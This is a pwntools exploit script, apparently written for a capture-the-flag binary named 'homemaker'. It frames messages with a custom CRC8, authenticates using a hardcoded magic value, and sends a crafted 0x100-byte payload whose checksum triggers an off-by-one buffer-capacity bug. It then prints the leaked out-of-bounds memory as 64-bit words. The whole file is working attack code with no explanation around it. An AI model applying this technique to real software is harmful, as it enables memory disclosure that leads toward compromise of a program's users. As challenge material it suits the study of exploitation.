from pwn import *
context.log_level='error'; context.arch='amd64'
def crc8(data):
    acc=0
    for b in data:
        acc^=b
        for _ in range(8):
            acc = ((acc<<1)^0x2f)&0xff if acc&0x80 else (acc<<1)&0xff
    return acc
def frame(p): return b'\x1b['+len(p).to_bytes(2,'big')+p+bytes([crc8(p)])+b'\x1b\\'
def read_frame(io):
    hdr = io.recvn(4, timeout=3)
    assert hdr[:2]==b'\x1b[', hdr
    L = u16(hdr[2:4], endian='big')
    body = io.recvn(L+3, timeout=3)
    return body[0], body[1:1+L]

p = process('./homemaker', stdin=process.PIPE, stdout=process.PIPE)
p.recvuntil(b'<<\n'); p.recvn(1)
p.send(frame(b'\x01'+(0x1337c35f).to_bytes(4,'big')))
print("auth:", read_frame(p))
# off-by-one: crc byte 0xff -> capacity 0x100 -> 0x01ff
pl = bytearray(b'\x02'+b'A'*0x100); pl[1]=205
assert crc8(bytes(pl))==0xff
p.send(frame(bytes(pl)))
print("append1:", read_frame(p)[0:1])
p.send(frame(b'\x03'))
st, data = read_frame(p)
print("sendstate status", hex(st), "len", hex(len(data)))
for off in range(0xf8, 0x140, 8):
    print(hex(off), data[off:off+8].hex(), hex(u64(data[off:off+8])))
p.close()
